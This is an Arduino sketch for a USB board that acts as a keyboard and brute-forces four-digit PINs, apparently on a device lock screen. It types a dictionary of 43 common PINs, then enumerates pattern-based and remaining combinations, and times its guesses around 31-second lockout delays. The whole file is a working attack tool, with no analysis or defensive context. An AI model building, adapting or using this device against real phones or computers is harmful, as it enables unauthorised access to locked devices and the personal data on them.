#include "DigiKeyboard.h"



//Dictionary Attack Variables
int count = 0;
int dict_size = 43;
int dict_counter = 0;

int pin_dict[43][4] = {{30, 31, 32, 33}, {30, 30, 30, 30}, {39, 39, 39, 39}, {30, 31, 30, 31}, {36, 36, 36, 36}, {30, 39, 39, 33},
{31, 39, 39, 39}, {33, 33, 33, 33}, {31, 31, 31, 31}, {35, 38, 35, 38}, {38, 38, 38, 38}, {32, 32, 32, 32},
{34, 34, 34, 34}, {35, 35, 35, 35}, {30, 30, 31, 31}, {30, 32, 30, 32}, {37, 37, 37, 37}, {31, 39, 39, 30},
{33, 32, 31, 30}, {30, 39, 30, 39}, {39, 38, 39, 38}, {31, 34, 37, 39}, {39, 39, 39, 36}, {30, 37, 30, 37},
{30, 31, 32, 39}, {30, 38, 37, 33}, {30, 38, 37, 35}, {39, 39, 36, 39}, {30, 38, 37, 34}, {39, 38, 37, 36},
{30, 39, 39, 39}, {30, 31, 32, 30}, {30, 38, 37, 36}, {30, 38, 38, 38}, {31, 33, 35, 37}, {31, 39, 39, 31},
{31, 32, 31, 32}, {39, 30, 31, 32}, {30, 30, 31, 32}, {30, 31, 32, 32}, {30, 32, 34, 36}, {30, 32, 31, 33}, {30, 38, 37, 37}};

//Patterns Variables
int num[10] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};

char a = 0; char b = 9;  char c = 0; char d = 0;
char e = 0; char f = 0; char g = 0; char h = 0;
int mode = 0;
bool main_patterns_done = false;



//increment_if_equal - increments a number if it equal to another number
int increment_if_equal(int main, int level_1, int level_2, int level_3)
{
  for (int i = 0; i < 9; i++)
  {
    if (level_1 == main && main <= 9)
      main++;
    if (level_2 != -1)
      if (level_2 == main && main <= 9)
        main++;
    if (level_3 != -1)
      if (level_3 == main && main <= 9)
        main++;
  }
  return main;
}
//increment_if_equal - END



//click_OK
void click_OK()
{
  //Presses OK/Enter and delays for 1s before the next attempt.
  if (count < 53)
    count++;
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
}
//click_OK - END



//wait
void wait()
{
  //Waits for 31 seconds after the first 5 attempts and the 5 attempts after them. Then, waits for 31 seconds after each wrong attempt.
  if(count == 5 || count == 10 || count > 10)
  {
    digitalWrite(1,HIGH);
    DigiKeyboard.sendKeyStroke(40); //Clicking OK to make the popup go away
    delay(31000);
    digitalWrite(1,LOW);
  }
}
//wait - END



//type
void type(int one, int two, int three, int four)
{
  DigiKeyboard.sendKeyStroke(one);
  DigiKeyboard.sendKeyStroke(two);
  DigiKeyboard.sendKeyStroke(three);
  DigiKeyboard.sendKeyStroke(four);
  click_OK();
  wait(); 
}
//type - END



//dict_attack
void dict_attack()
{
  //Dictionaty Attack - Supplies values from the dictionary
  type(pin_dict[dict_counter][0],pin_dict[dict_counter][1],pin_dict[dict_counter][2],pin_dict[dict_counter][3]);
  dict_counter++;
  dict_size--;
}
//dict_attack - END



//consecutives_asc
void consecutives_asc()
{
  //Ascending Consecutive Digits -> 2345, 3456, 4567,...
  if (a <= 9)
  {
    if (a == 1 || a == 0) // != 0123 & != 1234 -> dict
      a = 2;
    type(num[a],num[(a+1)%10],num[(a+2)%10],num[(a+3)%10]);
    a++;
  }
}
//consecutives_asc - END



//consecutives_desc
void consecutives_desc()
{
  //Descending Consecutive Digits -> 9876, 8765, 7654,...
  if (b > 0) //!= 0987 -> dict
  {
    if (b == 4) // != 4321 -> dict
      b--;
    type(num[b],num[(b+9)%10],num[(b+8)%10],num[(b+7)%10]);
    b--;
  }
}
//consecutives_desc - END



//repeated
void repeated()
{
  //Repeated Digits -> 3344, 4455, 5566,...
  if (c <= 9)
  {
    if (d <= 9)
    {
      d = increment_if_equal(d, c, -1, -1);
      if (c == 1 && d == 2) //!= 1122 -> dict.
        d++;
      if (c != 9 || d != 9)
      {
        type(num[c],num[c],num[d],num[d]);
        d++;
      }
      else
        d++;
    }
    else
    {
      d = 0;
      c++;
    }
  }
}
//repeated - END



//palindromes
void palindromes()
{
  //Palindromic Digits -> 2332, 3443, 8998,...
  if (e <= 9)
  {
    if (f <= 9)
    {
      f = increment_if_equal(f, e, -1, -1);
      if (e != 9 || f != 9)
      {
        type(num[e],num[f],num[f],num[e]);
        f++;
      }
      else
        f++;
    }
    else
    {
      f = 0;
      e++;
    }
  }
}
//palindromes - END



//alternating
void alternating()
{
  //Alternating Digits -> 3434, 5656, 8989,...
  if (g <= 9)
  {
    if (h <= 9)
    {
      h = increment_if_equal(h, g, -1, -1);
      if (g == 1 && (h == 2 || h == 3)) //!= 1212 & 1313 -> dict
        h = 4;
      else if (g == 1 && (h == 0 || h == 8))//!= 1010 & 1818 -> dict
        h = 9;
      if (g != 9 || h != 9)
      {
        type(num[g],num[h],num[g],num[h]);
        h++;
      }
      else
        h++;
    }
    else
    {
      h = 0;
      g++;
    }
  }
}
//alternating - END



//three_and_one -> 1444, 4144, 4414, 4441
void three_and_one()
{
  if (a <= 9)
  {
    if (b <= 9)
    {
      b = increment_if_equal(b, a, -1, -1);
      
      if (c == 0) // abbb
      {
        if ((a == 1 || a == 2) && b == 0) //!= 1000 -> dict
          b = 3;
        if (a != 9 || b != 9)
        {
          type(num[a],num[b],num[b],num[b]);
          if (a == 1 && b == 8) // != 1999 -> dict
            b++; //will reach 9 here and be increased to 10 at the end, then rolls over.0111
        }
        else
          b++;
      }
      else if (c == 1) // babb
      {
        if (a != 9 || b != 9)
          type(num[b],num[a],num[b],num[b]);
        else
          b++;
      }
      else if (c == 2) // bbab
      {
        if (a == 0 && b == 7) //!= 0070 -> dict
          b++;
        if (a != 9 || b != 9)
          type(num[b],num[b],num[a],num[b]);
      }
      else if (c == 3) // bbba
      {
        if (a == 0 && b == 7) //!= 0007 -> dict
          b++;
        if (a != 9 || b != 9)
          type(num[b],num[b],num[b],num[a]);
      }
      b++;
    }
    else
    {
      b = 0;
      a++;
    }
  }
  else
  {
    if (c <= 4)
      c++;
    a = 0;  b = 0;
  }
  if (c == 4)
  {
    c = 0;  mode = 1;
  }
}
//three_and_one - END



//two_and_two -> 1127, 1217, 1271, 2171, 2711, 2117
void two_and_two()
{
  if (a <= 9)
  {
    if (b <= 9)
    {
      b = increment_if_equal(b, a, -1, -1);
      if (c <= 9)
      {
        c = increment_if_equal(c, a, b, -1);
        
        if (d == 0) // aabc
        {
          if (a == 1 && b == 2 && c == 3) //!= 1123 -> dict
            c++;
          if ((a != 9 || b != 9) && c <= 9)
            type(num[a],num[a],num[b],num[c]);
        }
        
        else if (d == 1) // abac
          if ((a != 9 || b != 9) && c <= 9)
            type(num[a],num[b],num[a],num[c]);
        
        else if (d == 2) // abca
          if ((a != 9 || b != 9) && c <= 9)
            type(num[a],num[b],num[c],num[a]);
        
        else if (d == 3) // baca
          if ((a != 9 || b != 9) && c <= 9)
            type(num[b],num[a],num[c],num[a]);
        
        else if (d == 4) // bcaa
        {
          if (a == 3 && b == 1 && c == 2) //!= 1233 -> dict
            c++;
          if ((a != 9 || b != 9) && c <= 9)
          {
            type(num[b],num[c],num[a],num[a]);
            if (a == 8 && b == 1 && c == 8) //!= 1988 -> dict
              c++;
          }
        }
        else if (d == 5) // baac
        {
          if (a == 0 && b == 1 && c == 4) //!= 1004 -> dict
            c++;
          else if (a == 0 && b == 2 && c == 1) //!= 2001 -> dict
            c = 3;
          if ((a != 9 || b != 9) && c != 9)
            type(num[b],num[a],num[a],num[c]);
        }
        c++;
      }
      else
      {
        c = 0;
        b++;
      }
    }
    else
    {
      c = 0;  b = 0;
      a++;
    }
  }
  else
  {
    if (d <= 6)
      d++;
    a = 0;  b = 0;  c = 0;
  }
  if (d == 6)
  {
    d = 0;  mode = 2;
  }
}
//two_and_one - END



//four_of_four -> 1345, 5647, 9627
void four_of_four()
{
  if (a <= 9)
  {
    if (b <= 9)
    {
      b = increment_if_equal(b, a, -1, -1);
      if (c <= 9)
      {
        c = increment_if_equal(c, a, b, -1);
        if (d <= 9)
        {
          d = increment_if_equal(d, a, b, c);
          if (a == 1)
          {
            if (b == 2 && c == 3 && d == 0) //!= 1230 -> dict
              d = 4;
            else if (b == 3)
            {
              if (c == 2 && d == 4) //!= 1324 -> dict
                d++;
              else if (c == 5 && d == 7) //!= 1357 -> dict
                d++;
            }
            if (b == 9)
            {
              if (c == 8 && d >= 4 && d <= 7) //!= 1984 - 2012 -> dict: 1984-1987 & other implemented patterns
              {
                a = 2;  b = 0;  c = 1;  d = 3;
              }
            }
          }
          else if (a == 2)
          {
            if (b == 4 && c == 6 && d == 8) //!= 2468 -> dict
              d++;
            else if (b == 5 && c == 8 && d == 0) //!= 2580 -> dict
              d++;
          }
          if (b == a + 1 && c == b + 1 && d == c + 1 && d < 9)
            d++;
          else if (a == b + 1 && b == c + 1 && c == d + 1 && a != 9)
            a++;
          if ((a != 9 || b != 9 || c != 9) && d <= 9)
          {
            type(num[a],num[b],num[c],num[d]);
            d++;
          }
          else
            d++;
        }
        else
        {
          d = 0;
          c++;
        }
      }
      else
      {
        c = 0;  d = 0;
        b++;
      }
    }
    else
    {
      b = 0;  c = 0;  d = 0;
      a++;
    }
  }
  else
    mode = -1;
}
//four_of_four - END



//Setup
void setup()
{
  //Makes sure the PIN input field is working.
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  delay(3000);
}
//Setup - END



//Loop
void loop()
{
  //Brute forcing based on the most common patterns
  if (dict_size == 0 || count >= 53)
  {
    if (a == 10 && b == 0 && c == 10 && e == 10 && g == 10)
    {
        main_patterns_done = true;
        a = 0;  b = 0;  c = 0;  d = 0;  e = 0;  f = 0;  g = 0;  h = 0;
    }
    
    if (main_patterns_done == false)
    {
      consecutives_asc();
      consecutives_desc();
      repeated();
      palindromes();
      alternating();
    }
    if (main_patterns_done == true)
    {
      if (mode == 0)
        three_and_one();
      else if (mode == 1)
        two_and_two();
      else if (mode == 2)
        four_of_four();
    }
  }
  else
    //Dictionary Attack
    dict_attack();
}
//Loop - END
